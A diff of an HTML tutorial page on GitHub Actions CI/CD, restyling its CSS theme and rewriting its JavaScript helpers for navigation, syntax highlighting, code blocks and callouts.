@@ -2,140 +2,197 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GitHub Actions Masterclass — Beginner to Advanced</title>
-<meta name="description" content="Master CI/CD from zero to production. Build, test, deploy, and secure Python applications using real-world DevOps workflows.">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>GitHub Actions — Beginner to Advanced</title>
+<meta name="description" content="Master GitHub Actions CI/CD from zero to production with in-depth theory and hands-on Python DevOps examples.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
---bg:#ffffff;--bg2:#f8fafc;--bg3:#f1f5f9;
---text:#0f172a;--text2:#475569;--text3:#94a3b8;
+--bg:#ffffff;--bg2:#f8fafc;--bg3:#f1f5f9;--bg4:#e2e8f0;
+--text:#0f172a;--text2:#334155;--text3:#64748b;--text4:#94a3b8;
 --border:#e2e8f0;--border2:#cbd5e1;
---blue:#3b82f6;--blue-bg:#dbeafe;--blue-text:#1e40af;
---green:#10b981;--green-bg:#d1fae5;--green-text:#065f46;
---amber:#f59e0b;--amber-bg:#fef3c7;--amber-text:#92400e;
---red:#ef4444;--red-bg:#fee2e2;--red-text:#991b1b;
---purple:#8b5cf6;--purple-bg:#ede9fe;--purple-text:#5b21b6;
---orange-bg:#ffedd5;--orange-text:#9a3412;
+--accent:#6366f1;--accent2:#818cf8;--accent-bg:#eef2ff;--accent-text:#3730a3;
+--blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#1e40af;--blue-border:#bfdbfe;
+--green:#10b981;--green-bg:#f0fdf4;--green-text:#166534;--green-border:#bbf7d0;
+--amber:#f59e0b;--amber-bg:#fffbeb;--amber-text:#92400e;--amber-border:#fde68a;
+--red:#ef4444;--red-bg:#fef2f2;--red-text:#991b1b;--red-border:#fecaca;
+--purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#5b21b6;
+--orange:#f97316;--orange-bg:#fff7ed;--orange-text:#9a3412;
+--code-bg:#fafbff;--code-border:#d4d9f0;
+--kw:#7c3aed;--str:#059669;--cm:#94a3b8;--fn:#2563eb;--num:#d97706;--bool:#e11d48;--key:#0369a1;--val:#b45309;--tag:#6d28d9;--attr:#0f766e;--op:#64748b;
 --font-sans:'Inter',system-ui,-apple-system,sans-serif;
---font-mono:'Fira Code','Cascadia Code','JetBrains Mono',monospace;
---radius:8px;--radius-lg:12px;
+--font-mono:'JetBrains Mono','Fira Code',monospace;
+--radius:8px;--radius-lg:12px;--shadow:0 1px 3px rgba(0,0,0,0.06),0 1px 2px rgba(0,0,0,0.04);
 }
-@media(prefers-color-scheme:dark){
-:root{
---bg:#0f172a;--bg2:#1e293b;--bg3:#334155;
---text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
+@media(prefers-color-scheme:dark){:root{
+--bg:#0f172a;--bg2:#1e293b;--bg3:#334155;--bg4:#475569;
+--text:#f1f5f9;--text2:#cbd5e1;--text3:#94a3b8;--text4:#64748b;
 --border:#334155;--border2:#475569;
---blue-bg:#1e3a5f;--blue-text:#93c5fd;
---green-bg:#064e3b;--green-text:#6ee7b7;
---amber-bg:#78350f;--amber-text:#fcd34d;
---red-bg:#7f1d1d;--red-text:#fca5a5;
---purple-bg:#3b0764;--purple-text:#c4b5fd;
---orange-bg:#7c2d12;--orange-text:#fdba74;
+--accent:#818cf8;--accent2:#a5b4fc;--accent-bg:#1e1b4b;--accent-text:#c7d2fe;
+--blue:#60a5fa;--blue-bg:#172554;--blue-text:#93c5fd;--blue-border:#1e3a5f;
+--green:#34d399;--green-bg:#052e16;--green-text:#86efac;--green-border:#14532d;
+--amber:#fbbf24;--amber-bg:#451a03;--amber-text:#fcd34d;--amber-border:#78350f;
+--red:#f87171;--red-bg:#450a0a;--red-text:#fca5a5;--red-border:#7f1d1d;
+--purple:#a78bfa;--purple-bg:#2e1065;--purple-text:#c4b5fd;
+--code-bg:#1a1f36;--code-border:#2d3555;
+--kw:#c4b5fd;--str:#6ee7b7;--cm:#64748b;--fn:#93c5fd;--num:#fcd34d;--bool:#fda4af;--key:#7dd3fc;--val:#fcd34d;--tag:#c4b5fd;--attr:#5eead4;--op:#94a3b8;
+--shadow:0 1px 3px rgba(0,0,0,0.3);
 }}
-body{font-family:var(--font-sans);background:var(--bg);color:var(--text);line-height:1.7;font-size:16px}
-a{color:var(--blue);text-decoration:none}
-a:hover{text-decoration:underline}
-code{font-family:var(--font-mono);font-size:0.875em;background:var(--bg2);padding:2px 6px;border-radius:4px;border:1px solid var(--border)}
+body{font-family:var(--font-sans);background:var(--bg);color:var(--text);line-height:1.7;font-size:16px;-webkit-font-smoothing:antialiased}
+a{color:var(--accent);text-decoration:none;transition:color .15s}
+a:hover{text-decoration:underline;color:var(--accent2)}
+code{font-family:var(--font-mono);font-size:0.85em;background:var(--accent-bg);color:var(--accent-text);padding:2px 7px;border-radius:4px}
+strong{font-weight:600;color:var(--text)}
+.wrapper{display:flex;max-width:1260px;margin:0 auto;gap:36px;padding:0 24px}
+.sidebar{width:260px;flex-shrink:0;padding-top:32px;position:sticky;top:16px;max-height:calc(100vh - 32px);overflow-y:auto;scrollbar-width:thin}
+.sidebar::-webkit-scrollbar{width:3px}.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.main{flex:1;min-width:0;padding:32px 0 80px}
+.progress-wrap{margin-bottom:20px}
+.progress-label{font-size:12px;color:var(--text3);margin-bottom:6px;font-weight:500}
+.progress-bar{height:5px;border-radius:3px;background:var(--bg3);overflow:hidden}
+.progress-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--accent),var(--blue));transition:width 0.5s ease}
+.nav-btn{display:flex;align-items:center;gap:8px;width:100%;padding:7px 12px;margin-bottom:1px;border:none;border-radius:var(--radius);cursor:pointer;font-size:13px;font-family:var(--font-sans);text-align:left;background:transparent;color:var(--text3);transition:all 0.15s}
+.nav-btn:hover{background:var(--bg2);color:var(--text2)}
+.nav-btn.active{background:var(--accent-bg);color:var(--accent-text);font-weight:600}
+.nav-btn .icon{width:22px;text-align:center;font-size:13px;flex-shrink:0}
+.nav-btn .check{color:var(--green);font-weight:700}
 
-.wrapper{display:flex;max-width:1200px;margin:0 auto;gap:32px;padding:0 20px}
-.sidebar{width:250px;flex-shrink:0;padding-top:40px;position:sticky;top:20px;max-height:calc(100vh - 40px);overflow-y:auto;scrollbar-width:thin}
-.sidebar::-webkit-scrollbar{width:4px}
-.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.main{flex:1;min-width:0;padding:40px 0 80px}
-
-.progress-bar{height:4px;border-radius:2px;background:var(--border);margin-bottom:20px}
-.progress-fill{height:100%;border-radius:2px;background:var(--blue);transition:width 0.4s ease}
-.progress-label{font-size:12px;color:var(--text2);margin-bottom:6px}
-
-.nav-btn{display:flex;align-items:center;gap:8px;width:100%;padding:8px 10px;margin-bottom:2px;border:none;border-radius:var(--radius);cursor:pointer;font-size:13px;font-family:var(--font-sans);text-align:left;background:transparent;color:var(--text2);transition:all 0.15s}
-.nav-btn:hover{background:var(--bg2)}
-.nav-btn.active{background:var(--blue-bg);color:var(--blue-text);font-weight:500}
-.nav-btn .icon{width:22px;text-align:center;font-size:14px;flex-shrink:0}
-
-.hero{background:linear-gradient(135deg,#0d1117 0%,#161b22 50%,#1a1e2e 100%);border-radius:16px;padding:48px 36px;margin-bottom:40px;position:relative;overflow:hidden}
-.hero::after{content:'';position:absolute;top:0;right:0;width:300px;height:300px;background:radial-gradient(circle,rgba(88,166,255,0.12) 0%,transparent 70%)}
+/* Hero */
+.hero{background:linear-gradient(135deg,#1e1b4b 0%,#312e81 40%,#3730a3 100%);border-radius:20px;padding:52px 40px;margin-bottom:44px;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-50%;right:-20%;width:500px;height:500px;background:radial-gradient(circle,rgba(129,140,248,0.15) 0%,transparent 70%);pointer-events:none}
+.hero::after{content:'';position:absolute;bottom:-30%;left:-10%;width:400px;height:400px;background:radial-gradient(circle,rgba(99,102,241,0.1) 0%,transparent 70%);pointer-events:none}
 .hero *{position:relative}
-.hero h1{font-size:32px;font-weight:700;color:#fff;margin:0 0 12px;line-height:1.2}
-.hero p{color:#8b949e;font-size:16px;line-height:1.7;max-width:600px}
-.hero-badges{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
-.hero-stats{display:flex;gap:24px;margin-top:24px;flex-wrap:wrap}
-.hero-stats span{display:flex;align-items:center;gap:6px;color:#c9d1d9;font-size:14px}
+.hero h1{font-size:36px;font-weight:700;color:#fff;margin:0 0 14px;line-height:1.15;letter-spacing:-0.5px}
+.hero p{color:#c7d2fe;font-size:17px;line-height:1.7;max-width:620px}
+.hero-badges{display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap}
+.hero-badge{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;letter-spacing:0.4px;border:1px solid rgba(255,255,255,0.15)}
+.hb-1{background:rgba(99,102,241,0.3);color:#e0e7ff}.hb-2{background:rgba(16,185,129,0.2);color:#a7f3d0}.hb-3{background:rgba(244,114,182,0.2);color:#fbcfe8}
+.hero-stats{display:flex;gap:28px;margin-top:28px;flex-wrap:wrap}
+.hero-stats span{display:flex;align-items:center;gap:7px;color:#e0e7ff;font-size:14px;font-weight:500}
 
-.badge{display:inline-block;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;letter-spacing:0.3px}
-.badge-blue{background:#1e3a5f;color:#7dd3fc}
-.badge-green{background:#064e3b;color:#6ee7b7}
-.badge-purple{background:#3b0764;color:#c4b5fd}
+/* Sections */
+section{margin-bottom:56px;scroll-margin-top:80px}
+.sec-header{margin-bottom:4px}
+.sec-number{font-size:12px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:6px}
+h2{font-size:28px;font-weight:700;color:var(--text);margin:0 0 6px;line-height:1.25;letter-spacing:-0.3px}
+h2 .sec-icon{margin-right:10px}
+h3{font-size:19px;font-weight:600;color:var(--text);margin:32px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h4{font-size:16px;font-weight:600;color:var(--text);margin:24px 0 8px}
+.lead{font-size:17px;color:var(--text2);line-height:1.8;margin:6px 0 20px}
+p.desc{color:var(--text2);font-size:15px;line-height:1.85;margin:12px 0}
 
-section{margin-bottom:48px;scroll-margin-top:80px}
-h2{font-size:26px;font-weight:600;color:var(--text);margin:0 0 8px;line-height:1.3}
-h2 .sec-icon{margin-right:10px;font-size:24px}
-h3{font-size:18px;font-weight:600;color:var(--text);margin:28px 0 10px}
-p.desc{color:var(--text2);font-size:15px;line-height:1.8;margin:10px 0}
+/* Theory blocks */
+.theory{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px 28px;margin:20px 0}
+.theory h4{margin:0 0 10px;font-size:16px;color:var(--accent-text);display:flex;align-items:center;gap:8px}
+.theory h4::before{content:'📖';font-size:16px}
+.theory p{color:var(--text2);font-size:14px;line-height:1.85;margin:8px 0}
+.theory ul{margin:8px 0;padding-left:20px}
+.theory li{color:var(--text2);font-size:14px;line-height:1.85;margin:4px 0}
+.theory li strong{color:var(--text)}
 
-.code-block{background:#1e1e2e;border-radius:10px;overflow:hidden;margin:16px 0;border:1px solid #313244}
-.code-header{background:#313244;padding:8px 16px;display:flex;justify-content:space-between;align-items:center}
-.code-title{color:#cdd6f4;font-size:13px;font-weight:500}
-.code-lang{color:#6c7086;font-size:11px}
-.code-block pre{margin:0;padding:16px;overflow-x:auto;font-size:13px;line-height:1.6;color:#cdd6f4;font-family:var(--font-mono)}
-.code-block .kw{color:#cba6f7}.code-block .str{color:#a6e3a1}.code-block .cm{color:#6c7086;font-style:italic}.code-block .fn{color:#89b4fa}.code-block .num{color:#fab387}.code-block .bool{color:#f38ba8}
-.copy-btn{background:none;border:1px solid #45475a;color:#a6adc8;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-sans);transition:all .15s}
-.copy-btn:hover{background:#45475a;color:#cdd6f4}
+/* Code blocks — light themed with syntax highlighting */
+.code-block{background:var(--code-bg);border:1px solid var(--code-border);border-radius:var(--radius-lg);overflow:hidden;margin:18px 0;box-shadow:var(--shadow)}
+.code-header{background:var(--bg2);padding:10px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--code-border)}
+.code-title{color:var(--text2);font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+.code-title::before{content:'';width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.code-yaml .code-title::before{background:#7c3aed}
+.code-python .code-title::before{background:#2563eb}
+.code-bash .code-title::before{background:#059669}
+.code-docker .code-title::before{background:#0ea5e9}
+.code-text .code-title::before{background:#64748b}
+.code-lang{font-size:11px;font-weight:500;padding:2px 8px;border-radius:4px;background:var(--bg3);color:var(--text3)}
+.copy-btn{background:var(--bg);border:1px solid var(--border);color:var(--text3);padding:4px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:500;font-family:var(--font-sans);transition:all .15s;margin-left:8px}
+.copy-btn:hover{background:var(--accent-bg);color:var(--accent-text);border-color:var(--accent)}
+.code-block pre{margin:0;padding:18px 20px;overflow-x:auto;font-size:13px;line-height:1.75;color:var(--text2);font-family:var(--font-mono);tab-size:2}
+.kw{color:var(--kw);font-weight:500}
+.str{color:var(--str)}
+.cm{color:var(--cm);font-style:italic}
+.fn{color:var(--fn)}
+.num{color:var(--num)}
+.bl{color:var(--bool)}
+.ky{color:var(--key);font-weight:500}
+.vl{color:var(--val)}
+.tg{color:var(--tag)}
+.at{color:var(--attr)}
+.op{color:var(--op)}
+.pn{color:var(--text3)}
 
-.callout{border-radius:0 var(--radius) var(--radius) 0;padding:14px 18px;margin:16px 0;border-left:4px solid}
-.callout-title{font-weight:600;margin-bottom:6px;font-size:14px}
-.callout-body{font-size:13px;line-height:1.7}
+/* Callouts */
+.callout{border-radius:var(--radius-lg);padding:16px 20px;margin:20px 0;border-left:4px solid;display:flex;gap:14px}
+.callout-icon{font-size:20px;flex-shrink:0;margin-top:1px}
+.callout-content{flex:1}
+.callout-title{font-weight:600;margin-bottom:4px;font-size:14px}
+.callout-body{font-size:13.5px;line-height:1.8}
 .callout-info{background:var(--blue-bg);border-color:var(--blue);color:var(--blue-text)}
 .callout-warning{background:var(--amber-bg);border-color:var(--amber);color:var(--amber-text)}
 .callout-success{background:var(--green-bg);border-color:var(--green);color:var(--green-text)}
 .callout-danger{background:var(--red-bg);border-color:var(--red);color:var(--red-text)}
 
-.diagram-box{background:var(--bg2);border-radius:var(--radius-lg);padding:24px;margin:16px 0;border:0.5px solid var(--border);overflow-x:auto}
-.diagram-box pre{margin:0;font-size:13px;line-height:1.8;font-family:var(--font-mono);color:var(--text);white-space:pre}
+/* Diagrams */
+.diagram-box{background:var(--bg2);border-radius:var(--radius-lg);padding:28px;margin:20px 0;border:1px solid var(--border);overflow-x:auto}
+.diagram-box pre{margin:0;font-size:12.5px;line-height:1.7;font-family:var(--font-mono);color:var(--text2);white-space:pre}
 
-.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin:16px 0}
-.feature-card{background:var(--bg);border:0.5px solid var(--border);border-radius:10px;padding:16px}
-.feature-card .fi{font-size:20px;margin-bottom:6px}
+/* Feature grids */
+.feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin:18px 0}
+.feature-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 20px;transition:border-color .15s,box-shadow .15s}
+.feature-card:hover{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
+.feature-card .fi{font-size:22px;margin-bottom:8px}
 .feature-card .ft{font-weight:600;font-size:14px;color:var(--text);margin-bottom:4px}
-.feature-card .fd{font-size:12px;color:var(--text2);line-height:1.6}
+.feature-card .fd{font-size:13px;color:var(--text3);line-height:1.65}
 
-.steps{margin:16px 0}
+/* Steps */
+.steps{margin:18px 0}
 .step{display:flex;gap:14px}
 .step-line{display:flex;flex-direction:column;align-items:center}
-.step-num{width:32px;height:32px;border-radius:50%;background:var(--blue-bg);color:var(--blue-text);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600;flex-shrink:0}
-.step-connector{width:2px;flex:1;background:var(--border);min-height:20px}
-.step-content{padding-bottom:20px}
+.step-num{width:30px;height:30px;border-radius:50%;background:var(--accent-bg);color:var(--accent-text);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0}
+.step-connector{width:2px;flex:1;background:var(--border);min-height:16px}
+.step-content{padding-bottom:18px}
 .step-title{font-weight:600;font-size:14px;color:var(--text)}
-.step-desc{font-size:13px;color:var(--text2);line-height:1.6;margin-top:4px}
+.step-desc{font-size:13px;color:var(--text3);line-height:1.65;margin-top:3px}
 
-.mobile-bar{display:none;position:sticky;top:0;z-index:100;padding:10px 16px;background:var(--bg);border-bottom:0.5px solid var(--border)}
-.mobile-bar button{border:none;background:none;font-size:22px;cursor:pointer;color:var(--text);padding:4px}
-.mobile-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.4)}
+/* Key concept cards */
+.concept-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;margin:18px 0}
+.concept-card{border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 20px;background:var(--bg);position:relative;overflow:hidden}
+.concept-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--accent)}
+.concept-card .cc-title{font-weight:600;font-size:15px;color:var(--text);margin-bottom:6px}
+.concept-card .cc-desc{font-size:13px;color:var(--text3);line-height:1.7}
+
+/* Compare table */
+.compare-table{width:100%;border-collapse:collapse;margin:18px 0;font-size:14px;border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden}
+.compare-table th{background:var(--bg2);color:var(--text);font-weight:600;padding:12px 16px;text-align:left;border-bottom:1px solid var(--border);font-size:13px}
+.compare-table td{padding:10px 16px;border-bottom:1px solid var(--border);color:var(--text2);font-size:13px;line-height:1.6}
+.compare-table tr:last-child td{border-bottom:none}
+.compare-table tr:hover td{background:var(--bg2)}
+
+/* Mobile */
+.mobile-bar{display:none;position:sticky;top:0;z-index:100;padding:10px 16px;background:var(--bg);border-bottom:1px solid var(--border);backdrop-filter:blur(12px);align-items:center;gap:10px}
+.mobile-bar button{border:none;background:none;font-size:20px;cursor:pointer;color:var(--text);padding:4px}
+.mobile-bar span{font-size:14px;font-weight:600;color:var(--text)}
+.mobile-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.45)}
 .mobile-overlay.open{display:block}
-.mobile-drawer{width:280px;height:100%;background:var(--bg);padding:20px;overflow-y:auto}
+.mobile-drawer{width:300px;height:100%;background:var(--bg);padding:24px;overflow-y:auto}
 
-.footer{border-top:0.5px solid var(--border);margin-top:48px;padding-top:24px;text-align:center}
-.footer p{color:var(--text2);font-size:13px}
-.footer .sub{color:var(--text3);font-size:12px;margin-top:4px}
+.footer{border-top:1px solid var(--border);margin-top:56px;padding-top:28px;text-align:center}
+.footer p{color:var(--text3);font-size:13px}
+.footer .sub{color:var(--text4);font-size:12px;margin-top:6px}
 
-@media(max-width:800px){
-.sidebar{display:none}
-.mobile-bar{display:flex}
-.main{padding:20px 0 60px}
-.hero{padding:32px 20px;border-radius:12px}
-.hero h1{font-size:24px}
+.sep{width:60px;height:3px;border-radius:2px;background:linear-gradient(90deg,var(--accent),var(--blue));margin:8px 0 20px}
+
+@media(max-width:860px){
+.sidebar{display:none}.mobile-bar{display:flex!important}
+.main{padding:20px 0 60px}.hero{padding:32px 24px;border-radius:14px}.hero h1{font-size:26px}
+.wrapper{padding:0 16px}
 }
 </style>
 </head>
 <body>
 
-<div class="mobile-bar">
+<div class="mobile-bar" id="mobileBar">
 <button onclick="toggleMobile()" aria-label="Menu">☰</button>
-<span style="font-size:14px;font-weight:600;margin-left:8px">GitHub Actions Masterclass</span>
+<span>GitHub Actions Masterclass</span>
 </div>
-
 <div class="mobile-overlay" id="mobileOverlay" onclick="toggleMobile()">
 <div class="mobile-drawer" onclick="event.stopPropagation()" id="mobileDrawer"></div>
 </div>
@@ -146,126 +203,136 @@ p.desc{color:var(--text2);font-size:15px;line-height:1.8;margin:10px 0}
 </div>
 
 <script>
-const sections=[
-{id:"intro",title:"Introduction",icon:"🚀"},
-{id:"setup",title:"Tools & initial setup",icon:"🔧"},
-{id:"blocks",title:"Building blocks",icon:"🧱"},
-{id:"triggers",title:"Event triggers",icon:"⚡"},
-{id:"runners",title:"Workflow runners",icon:"💻"},
-{id:"actions",title:"Third-party actions",icon:"📦"},
-{id:"filters",title:"Event filters & activity types",icon:"🔍"},
-{id:"contexts",title:"Contexts, expressions & variables",icon:"📐"},
-{id:"functions",title:"Functions",icon:"🧮"},
-{id:"flow",title:"Controlling execution flow",icon:"🔀"},
-{id:"io",title:"Inputs & outputs",icon:"↔️"},
-{id:"caching",title:"Caching & artifacts",icon:"💾"},
-{id:"matrix",title:"Working with matrices",icon:"📊"},
-{id:"envs",title:"Environments",icon:"🌍"},
-{id:"custom",title:"Custom actions",icon:"⚙️"},
-{id:"reusable",title:"Reusable workflows",icon:"♻️"},
-{id:"concurrency",title:"Managing concurrency",icon:"🔒"},
-{id:"security",title:"Workflow security",icon:"🛡️"},
-{id:"conclusion",title:"Conclusion",icon:"🎓"}
+const S=[
+{id:"intro",n:"01",title:"Introduction",icon:"🚀"},
+{id:"setup",n:"02",title:"Tools & initial setup",icon:"🔧"},
+{id:"blocks",n:"03",title:"Building blocks",icon:"🧱"},
+{id:"triggers",n:"04",title:"Event triggers",icon:"⚡"},
+{id:"runners",n:"05",title:"Workflow runners",icon:"💻"},
+{id:"actions",n:"06",title:"Third-party actions",icon:"📦"},
+{id:"filters",n:"07",title:"Event filters & activity types",icon:"🔍"},
+{id:"contexts",n:"08",title:"Contexts, expressions & variables",icon:"📐"},
+{id:"functions",n:"09",title:"Functions",icon:"🧮"},
+{id:"flow",n:"10",title:"Controlling execution flow",icon:"🔀"},
+{id:"io",n:"11",title:"Inputs & outputs",icon:"↔️"},
+{id:"caching",n:"12",title:"Caching & artifacts",icon:"💾"},
+{id:"matrix",n:"13",title:"Working with matrices",icon:"📊"},
+{id:"envs",n:"14",title:"Environments",icon:"🌍"},
+{id:"custom",n:"15",title:"Custom actions",icon:"⚙️"},
+{id:"reusable",n:"16",title:"Reusable workflows",icon:"♻️"},
+{id:"concurrency",n:"17",title:"Managing concurrency",icon:"🔒"},
+{id:"security",n:"18",title:"Workflow security",icon:"🛡️"},
+{id:"conclusion",n:"19",title:"Conclusion",icon:"🎓"}
 ];
+let activeId="intro";const visited=new Set(["intro"]);
 
-let activeId="intro";
-const visited=new Set(["intro"]);
-
-function buildNav(container){
-container.innerHTML=`
-<div class="progress-label">Progress: <span id="pct${container.id}">5</span>%</div>
-<div class="progress-bar"><div class="progress-fill" id="bar${container.id}" style="width:5%"></div></div>
-<nav>${sections.map(s=>`<button class="nav-btn${s.id===activeId?' active':''}" data-id="${s.id}" onclick="scrollToSec('${s.id}')"><span class="icon">${visited.has(s.id)?'✓':s.icon}</span><span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.title}</span></button>`).join('')}</nav>`;
-}
+function buildNav(c){
+c.innerHTML=`<nav style="padding-top:4px">${S.map(s=>`<button class="nav-btn${s.id===activeId?' active':''}" data-id="${s.id}" onclick="go('${s.id}')"><span class="icon">${s.icon}</span><span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.title}</span></button>`).join('')}</nav>`;}
 
 function updateNav(){
-const pct=Math.round(visited.size/sections.length*100);
-document.querySelectorAll('[id^="pct"]').forEach(e=>e.textContent=pct);
-document.querySelectorAll('[id^="bar"]').forEach(e=>e.style.width=pct+'%');
 document.querySelectorAll('.nav-btn').forEach(b=>{
-const id=b.dataset.id;
-b.classList.toggle('active',id===activeId);
-b.querySelector('.icon').textContent=visited.has(id)?'✓':sections.find(s=>s.id===id).icon;
-});
+const id=b.dataset.id;b.classList.toggle('active',id===activeId);});}
+
+function go(id){activeId=id;visited.add(id);updateNav();document.getElementById(id)?.scrollIntoView({behavior:'smooth'});toggleMobile(false);}
+function toggleMobile(f){const o=document.getElementById('mobileOverlay');const open=f!==undefined?f:!o.classList.contains('open');o.classList.toggle('open',open);if(open)buildNav(document.getElementById('mobileDrawer'));}
+function copyCode(btn){const pre=btn.closest('.code-block').querySelector('pre');navigator.clipboard.writeText(pre.textContent).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500)});}
+
+// Syntax highlighting helpers
+function hl(raw,lang){
+  let s=raw.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  if(lang==='yaml'){
+    s=s.replace(/^(\s*)(#.*)$/gm,'$1<span class=cm>$2</span>');
+    s=s.replace(/^(\s*)([\w][\w.\-\/]*)(\s*:\s*\|?\s*)$/gm,'$1<span class=ky>$2</span>$3');
+    s=s.replace(/^(\s*)([\w][\w.\-\/]*)(\s*:)/gm,'$1<span class=ky>$2</span>$3');
+    s=s.replace(/:\s*(&quot;[^"]*&quot;|"[^"]*")/g,': <span class=str>$1</span>');
+    s=s.replace(/:\s*('[^']*')/g,': <span class=str>$1</span>');
+    s=s.replace(/:\s*(true|false)\b/gi,': <span class=bl>$1</span>');
+    s=s.replace(/:\s*(\d+\.?\d*)\s*$/gm,': <span class=num>$1</span>');
+    s=s.replace(/(- )(uses:)/gm,'$1<span class=ky>$2</span>');
+    s=s.replace(/(\$\{\{[^}]*\}\})/g,'<span class=fn>$1</span>');
+  } else if(lang==='python'){
+    s=s.replace(/(#.*)$/gm,'<span class=cm>$1</span>');
+    s=s.replace(/\b(from|import|def|class|return|if|else|elif|with|as|for|in|while|try|except|finally|raise|yield|lambda|not|and|or|is|True|False|None)\b/g,'<span class=kw>$1</span>');
+    s=s.replace(/("[^"]*"|'[^']*')/g,'<span class=str>$1</span>');
+    s=s.replace(/\b(\d+)\b/g,'<span class=num>$1</span>');
+    s=s.replace(/(def\s+)(\w+)/g,'$1<span class=fn>$2</span>');
+  } else if(lang==='bash'||lang==='dockerfile'){
+    s=s.replace(/(#.*)$/gm,'<span class=cm>$1</span>');
+    s=s.replace(/\b(FROM|RUN|COPY|ENTRYPOINT|ENV|WORKDIR|EXPOSE|CMD|ARG)\b/g,'<span class=kw>$1</span>');
+    s=s.replace(/("[^"]*")/g,'<span class=str>$1</span>');
+    s=s.replace(/\b(echo|set|if|then|fi|else|exit|chmod|pip|python|curl|cd|mkdir|export|source)\b/g,'<span class=fn>$1</span>');
+  }
+  return s;
 }
 
-function scrollToSec(id){
-activeId=id;visited.add(id);updateNav();
-document.getElementById(id)?.scrollIntoView({behavior:'smooth'});
-toggleMobile(false);
-}
-
-function toggleMobile(force){
-const o=document.getElementById('mobileOverlay');
-const open=force!==undefined?force:!o.classList.contains('open');
-o.classList.toggle('open',open);
-if(open)buildNav(document.getElementById('mobileDrawer'));
-}
-
-function copyCode(btn){
-const pre=btn.closest('.code-block').querySelector('pre');
-navigator.clipboard.writeText(pre.textContent).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500)});
-}
-
-function code(title,lang,content){
-return`<div class="code-block"><div class="code-header"><span class="code-title">${title}</span><div style="display:flex;gap:8px;align-items:center"><span class="code-lang">${lang}</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div></div><pre><code>${content}</code></pre></div>`;
-}
+function code(title,lang,raw){
+const cls=lang==='dockerfile'?'docker':lang;
+return`<div class="code-block code-${cls}"><div class="code-header"><span class="code-title">${title}</span><div style="display:flex;align-items:center;gap:6px"><span class="code-lang">${lang.toUpperCase()}</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div></div><pre>${hl(raw,lang)}</pre></div>`;}
 
 function callout(type,title,body){
-const icons={info:'💡',warning:'⚠️',success:'✅',danger:'🔴'};
-return`<div class="callout callout-${type}"><div class="callout-title">${icons[type]} ${title}</div><div class="callout-body">${body}</div></div>`;
-}
+const icons={info:'💡',warning:'⚠️',success:'✅',danger:'🚨'};
+return`<div class="callout callout-${type}"><div class="callout-icon">${icons[type]}</div><div class="callout-content"><div class="callout-title">${title}</div><div class="callout-body">${body}</div></div></div>`;}
 
-function diagram(content){
-return`<div class="diagram-box"><pre>${content}</pre></div>`;
-}
+function theory(title,body){return`<div class="theory"><h4>${title}</h4>${body}</div>`;}
+function diagram(c){return`<div class="diagram-box"><pre>${c}</pre></div>`;}
+function grid(items){return`<div class="feature-grid">${items.map(i=>`<div class="feature-card"><div class="fi">${i[0]}</div><div class="ft">${i[1]}</div><div class="fd">${i[2]}</div></div>`).join('')}</div>`;}
+function steps(s){return`<div class="steps">${s.map((x,i)=>`<div class="step"><div class="step-line"><div class="step-num">${i+1}</div>${i<s.length-1?'<div class="step-connector"></div>':''}</div><div class="step-content"><div class="step-title">${x[0]}</div><div class="step-desc">${x[1]}</div></div></div>`).join('')}</div>`;}
+function concepts(items){return`<div class="concept-row">${items.map(i=>`<div class="concept-card"><div class="cc-title">${i[0]}</div><div class="cc-desc">${i[1]}</div></div>`).join('')}</div>`;}
